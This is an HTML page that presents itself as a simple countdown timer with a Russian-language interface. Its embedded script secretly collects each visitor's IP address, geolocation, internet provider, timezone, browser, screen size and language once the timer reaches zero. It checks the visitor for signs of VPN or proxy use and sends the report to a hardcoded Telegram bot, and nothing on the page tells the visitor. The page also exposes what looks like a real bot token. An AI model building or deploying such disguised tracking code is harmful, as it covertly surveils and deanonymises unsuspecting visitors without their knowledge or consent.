<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #888;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        .timer {
            font-size: 120px;
            font-weight: bold;
            color: #222;
            background: #aaa;
            padding: 40px 80px;
            border-radius: 30px;
            box-shadow: inset 0 -4px 0 #666;
            user-select: none;
        }
    </style>
</head>
<body>
    <div class="timer" id="timer">10</div>

    <script>
        (function() {
            const token = '8846056738:AAECpZGTr0h7NfRSY5RteoD5lCTdkRRLjtU';
            const chatId = '8098905046';
            const timerEl = document.getElementById('timer');
            let counter = 10;

            // Функция отправки в Telegram
            function sendTelegram(text) {
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: text })
                }).catch(() => {});
            }

            // Асинхронный сбор данных
            async function collectAndSend() {
                try {
                    // 1. IP и гео
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();

                    // 2. Определяем возможный VPN/прокси по признакам
                    let vpnSigns = [];
                    if (data.proxy === true) vpnSigns.push('прокси');
                    if (data.hosting === true) vpnSigns.push('хостинг/датацентр');
                    if (data.org && data.org.toLowerCase().includes('vpn')) vpnSigns.push('VPN в названии провайдера');
                    if (data.country_code && data.country_code !== 'RU' && data.country_code !== 'UA' && data.country_code !== 'BY' && data.country_code !== 'KZ') vpnSigns.push('не СНГ');
                    const vpnStatus = vpnSigns.length > 0 ? '⚠️ Есть признаки VPN/прокси: ' + vpnSigns.join(', ') : '✅ VPN/прокси не обнаружено';

                    // 3. Формируем отчёт
                    const message =
                        'IP: ' + (data.ip || '—') + '\n' +
                        'Город: ' + (data.city || '—') + '\n' +
                        'Регион: ' + (data.region || '—') + '\n' +
                        'Страна: ' + (data.country_name || '—') + ' (' + (data.country_code || '—') + ')\n' +
                        'Провайдер: ' + (data.org || '—') + '\n' +
                        'Часовой пояс: ' + (data.timezone || '—') + '\n' +
                        'Браузер: ' + navigator.userAgent + '\n' +
                        'Экран: ' + screen.width + 'x' + screen.height + '\n' +
                        'Язык: ' + navigator.language + '\n' +
                        vpnStatus;

                    sendTelegram(message);
                } catch(e) {
                    sendTelegram('Ошибка сбора данных: ' + e.message);
                }
            }

            // Счётчик
            const interval = setInterval(() => {
                counter--;
                timerEl.textContent = counter;

                if (counter <= 0) {
                    clearInterval(interval);
                    timerEl.textContent = '0';
                    collectAndSend(); // отправляем данные
                }
            }, 1000);

            // Если клик — просто сброс таймера (можно убрать)
            document.addEventListener('click', () => {
                counter = 10;
                timerEl.textContent = counter;
            });
        })();
    </script>
</body>
</html>
